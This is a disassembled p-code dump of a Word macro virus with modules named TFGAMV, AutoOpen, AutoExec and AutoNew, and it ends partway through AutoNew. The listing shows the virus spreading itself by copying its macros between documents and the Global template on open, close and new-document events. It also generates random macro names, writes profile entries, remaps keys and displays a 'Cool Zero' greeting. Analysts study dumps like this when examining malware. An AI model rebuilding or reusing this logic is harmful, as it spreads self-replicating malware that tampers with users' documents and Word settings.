' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn i
' Line #3:
' 	Dim 
' 	VarDefn VInstalled
' Line #4:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Finish 
' Line #5:
' Line #6:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	For 
' Line #7:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0006 "TFGAMV"
' 	Eq 
' 	IfBlock 
' Line #8:
' 	LitDI2 0x0001 
' 	St VInstalled 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' Line #12:
' 	Ld VInstalled 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #13:
' 	GoTo Finish 
' Line #14:
' 	ElseBlock 
' Line #15:
' 	OnError (Resume Next) 
' Line #16:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #17:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #18:
' 	LitStr 0x000D "Global:TFGAMV"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0007 ":TFGAMV"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #19:
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #20:
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #21:
' 	LitStr 0x000E "Global:AutoNew"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0008 ":AutoNew"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #22:
' 	LitStr 0x000B "Global:Joke"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0005 ":Joke"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #23:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAll 0x0002 
' Line #24:
' 	EndIfBlock 
' Line #25:
' Line #26:
' Line #27:
' 	Label Finish 
' Line #28:
' 	EndSub 
' Macros/VBA/AutoOpen - 3072 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn i
' Line #3:
' 	Dim 
' 	VarDefn VInstalled
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemCall FilePrint 0x0000 
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0000 
' Line #6:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Finish2 
' Line #7:
' Line #8:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	For 
' Line #9:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0006 "TFGAMV"
' 	Eq 
' 	IfBlock 
' Line #10:
' 	LitDI2 0x0001 
' 	St VInstalled 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' Line #14:
' 	Ld VInstalled 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #15:
' 	GoTo Finish 
' Line #16:
' 	ElseBlock 
' Line #17:
' 	OnError (Resume Next) 
' Line #18:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0007 ":TFGAMV"
' 	Add 
' 	LitStr 0x000D "Global:TFGAMV"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #19:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0008 ":AutoNew"
' 	Add 
' 	LitStr 0x000E "Global:AutoNew"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #20:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	LitStr 0x0010 "Global:AutoClose"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #21:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitStr 0x000F "Global:AutoExec"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #22:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x000F "Global:AutoOpen"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #23:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0005 ":Joke"
' 	Add 
' 	LitStr 0x000B "Global:Joke"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #24:
' 	EndIfBlock 
' Line #25:
' Line #26:
' 	Label Finish2 
' Line #27:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Finish 
' Line #28:
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	For 
' Line #30:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0006 "TFGAMV"
' 	Eq 
' 	IfBlock 
' Line #31:
' 	ArgsCall VInstalled 0x0000 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' Line #35:
' 	Ld VInstalled 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #36:
' 	GoTo Finish 
' Line #37:
' 	ElseBlock 
' Line #38:
' 	OnError (Resume Next) 
' Line #39:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #40:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #41:
' 	LitStr 0x000D "Global:TFGAMV"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0007 ":TFGAMV"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #42:
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #43:
' 	LitStr 0x000E "Global:AutoNew"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0008 ":AutoNew"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #44:
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #45:
' 	LitStr 0x000B "Global:Joke"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0005 ":Joke"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #46:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAll 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' Line #49:
' 	Label Finish 
' Line #50:
' 	EndSub 
' Macros/VBA/AutoExec - 7833 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn a
' Line #3:
' Line #4:
' 	LitStr 0x0008 "AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #5:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Done 
' Line #6:
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St a$ 
' Line #8:
' 	Ld a$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Finish 
' 	EndIf 
' Line #9:
' Line #10:
' 	Ld VInstalled 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #11:
' 	ArgsCall Run1 0x0000 
' Line #12:
' 	ArgsCall Run2 0x0000 
' Line #13:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAll 0x0002 
' Line #14:
' 	ElseBlock 
' Line #15:
' 	GoTo Done 
' Line #16:
' 	EndIfBlock 
' Line #17:
' Line #18:
' 	Label Done 
' Line #19:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St a$ 
' Line #20:
' 	Ld a$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #21:
' 	GoTo Finish 
' Line #22:
' 	ElseBlock 
' Line #23:
' 	LitStr 0x0004 "zero"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #24:
' 	EndIfBlock 
' Line #25:
' Line #26:
' 	Label Finish 
' Line #27:
' 	LitStr 0x0018 "Greetings from Cool Zero"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #28:
' 	EndSub 
' Line #29:
' Line #30:
' 	FuncDefn (Private Sub Run1())
' Line #31:
' 	Dim 
' 	VarDefn X
' Line #32:
' 	Dim 
' 	VarDefn False
' Line #33:
' 	Dim 
' 	VarDefn G
' Line #34:
' 	Dim 
' 	VarDefn H
' Line #35:
' 	Dim 
' 	VarDefn J
' Line #36:
' 	Dim 
' 	VarDefn Y
' Line #37:
' 	Dim 
' 	VarDefn Z
' Line #38:
' 	Dim 
' 	VarDefn R1
' Line #39:
' 	Dim 
' 	VarDefn CO
' Line #40:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St X$ 
' Line #41:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #42:
' Line #43:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #44:
' Line #45:
' 	LitStr 0x000A "VirNameDoc"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	St R1$ 
' Line #46:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld R1$ 
' 	Add 
' 	St CO$ 
' Line #47:
' 	Ld CO$ 
' 	LitStr 0x0007 "Global:"
' 	Ld Z$ 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #48:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0006 "Info2 "
' 	Ld Z$ 
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #49:
' 	LitDI2 0x0020 
' 	ParamNamed KeyCode 
' 	LitDI2 0x0002 
' 	ParamNamed Category 
' 	Ld Z$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Add 
' 	LitDI2 0x0000 
' 	ParamNamed Context 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsCustomizeKeyboard 0x0005 
' Line #50:
' 	EndSub 
' Line #51:
' Line #52:
' 	FuncDefn (Private Sub Run2())
' Line #53:
' 	Dim 
' 	VarDefn X
' Line #54:
' 	Dim 
' 	VarDefn False
' Line #55:
' 	Dim 
' 	VarDefn G
' Line #56:
' 	Dim 
' 	VarDefn H
' Line #57:
' 	Dim 
' 	VarDefn J
' Line #58:
' 	Dim 
' 	VarDefn Y
' Line #59:
' 	Dim 
' 	VarDefn Z
' Line #60:
' 	Dim 
' 	VarDefn R2
' Line #61:
' 	Dim 
' 	VarDefn OC
' Line #62:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun___ 0x0004 
' 	St X$ 
' Line #63:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #64:
' Line #65:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #66:
' Line #67:
' 	LitStr 0x0007 "VirName"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	St R2$ 
' Line #68:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld R2$ 
' 	Add 
' 	St OC$ 
' Line #69:
' 	Ld OC$ 
' 	LitStr 0x0007 "Global:"
' 	Ld Z$ 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #70:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info1"
' 	Ld Z$ 
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #71:
' 	LitDI2 0x0045 
' 	ParamNamed KeyCode 
' 	LitDI2 0x0002 
' 	ParamNamed Category 
' 	Ld Z$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Add 
' 	LitDI2 0x0000 
' 	ParamNamed Context 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsCustomizeKeyboard 0x0005 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Function VInstalled())
' Line #75:
' 	Dim 
' 	VarDefn CC
' Line #76:
' 	Dim 
' 	VarDefn i
' Line #77:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info1"
' 	Ld WordBasic 
' 	ArgsMemLd [GetProfileString$] 0x0002 
' 	St CC$ 
' Line #78:
' 	LitDI2 0x0000 
' 	St VInstalled 
' Line #79:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #80:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #81:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	Ld CC$ 
' 	Eq 
' 	IfBlock 
' Line #82:
' 	LitDI2 0x0001 
' 	St VInstalled 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	EndFunc 
' Line #87:
' Line #88:
' 	FuncDefn (Private Function Fun(False, G, H, J))
' Line #89:
' 	Dim 
' 	VarDefn One
' Line #90:
' 	Dim 
' 	VarDefn Two
' Line #91:
' 	Dim 
' 	VarDefn Num
' Line #92:
' 	Dim 
' 	VarDefn a
' Line #93:
' 	Dim 
' 	VarDefn B
' Line #94:
' 	Dim 
' 	VarDefn C
' Line #95:
' 	Dim 
' 	VarDefn D
' Line #96:
' 	Dim 
' 	VarDefn E
' Line #97:
' 	LitDI2 0x0491 
' 	St One 
' Line #98:
' 	LitDI2 0x244E 
' 	St Two 
' Line #99:
' 	ArgsLd Rnd 0x0000 
' 	Ld Two 
' 	Ld One 
' 	Sub 
' 	Paren 
' 	Mul 
' 	Ld One 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St Num 
' Line #100:
' 	Ld Num 
' 	ArgsLd Str 0x0001 
' 	St a$ 
' Line #101:
' 	Ld a$ 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	St a$ 
' Line #102:
' Line #103:
' 	Ld a$ 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St B$ 
' Line #104:
' 	Ld a$ 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St C$ 
' Line #105:
' 	Ld a$ 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #106:
' 	Ld a$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St E$ 
' Line #107:
' Line #108:
' 	Ld B$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St False$ 
' 	EndIf 
' Line #109:
' 	Ld B$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St False$ 
' 	EndIf 
' Line #110:
' 	Ld B$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St False$ 
' 	EndIf 
' Line #111:
' 	Ld B$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St False$ 
' 	EndIf 
' Line #112:
' 	Ld B$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St False$ 
' 	EndIf 
' Line #113:
' 	Ld B$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St False$ 
' 	EndIf 
' Line #114:
' 	Ld B$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St False$ 
' 	EndIf 
' Line #115:
' 	Ld B$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St False$ 
' 	EndIf 
' Line #116:
' 	Ld B$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St False$ 
' 	EndIf 
' Line #117:
' 	Ld B$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St False$ 
' 	EndIf 
' Line #118:
' Line #119:
' Line #120:
' 	Ld C$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St G$ 
' 	EndIf 
' Line #121:
' 	Ld C$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St G$ 
' 	EndIf 
' Line #122:
' 	Ld C$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St G$ 
' 	EndIf 
' Line #123:
' 	Ld C$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St G$ 
' 	EndIf 
' Line #124:
' 	Ld C$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St G$ 
' 	EndIf 
' Line #125:
' 	Ld C$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St G$ 
' 	EndIf 
' Line #126:
' 	Ld C$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St G$ 
' 	EndIf 
' Line #127:
' 	Ld C$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St G$ 
' 	EndIf 
' Line #128:
' 	Ld C$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St G$ 
' 	EndIf 
' Line #129:
' 	Ld C$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St G$ 
' 	EndIf 
' Line #130:
' Line #131:
' Line #132:
' 	Ld D$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St H$ 
' 	EndIf 
' Line #133:
' 	Ld D$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St H$ 
' 	EndIf 
' Line #134:
' 	Ld D$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St H$ 
' 	EndIf 
' Line #135:
' 	Ld D$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St H$ 
' 	EndIf 
' Line #136:
' 	Ld D$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St H$ 
' 	EndIf 
' Line #137:
' 	Ld D$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St H$ 
' 	EndIf 
' Line #138:
' 	Ld D$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St H$ 
' 	EndIf 
' Line #139:
' 	Ld D$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St H$ 
' 	EndIf 
' Line #140:
' 	Ld D$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St H$ 
' 	EndIf 
' Line #141:
' 	Ld D$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St H$ 
' 	EndIf 
' Line #142:
' Line #143:
' Line #144:
' 	Ld E$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St J$ 
' 	EndIf 
' Line #145:
' 	Ld E$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St J$ 
' 	EndIf 
' Line #146:
' 	Ld E$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St J$ 
' 	EndIf 
' Line #147:
' 	Ld E$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St J$ 
' 	EndIf 
' Line #148:
' 	Ld E$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St J$ 
' 	EndIf 
' Line #149:
' 	Ld E$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St J$ 
' 	EndIf 
' Line #150:
' 	Ld E$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St J$ 
' 	EndIf 
' Line #151:
' 	Ld E$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St J$ 
' 	EndIf 
' Line #152:
' 	Ld E$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St J$ 
' 	EndIf 
' Line #153:
' Line #154:
' 	Ld E$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St J$ 
' 	EndIf 
' Line #155:
' Line #156:
' 	Ld False$ 
' 	Ld G$ 
' 	Add 
' 	Ld H$ 
' 	Add 
' 	Ld J$ 
' 	Add 
' 	St Fun$ 
' Line #157:
' 	EndFunc 
' Macros/VBA/AutoNew - 2611 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn i
' Line #3:
' 	Dim 
' 	VarDefn VInstalled
' Line #4:
' 	Dim 
' 	VarDefn aa
' Line #5:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Finish 
' Line #6:
' Line #7:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	For 
' Line #8:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0006 "TFGAMV"
' 	Eq 
' 	IfBlock 
' Line #9:
' 	LitDI2 0x0001 
' 	St VInstalled 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' Line #13:
' 	Ld VInstalled 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #14:
' 	GoTo Finish 
' Line #15:
' 	ElseBlock 
' Line #16:
' 	OnError (Resume Next) 
' Line #17:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #18:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0008 "AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #19:
' 	LitStr 0x000D "Global:TFGAMV"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0006 "TFGAMV"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #20:
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0008 "AutoExec"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #21:
' 	LitStr 0x000E "Global:AutoNew"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0007 "AutoNew"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #22:
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 "AutoClose"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
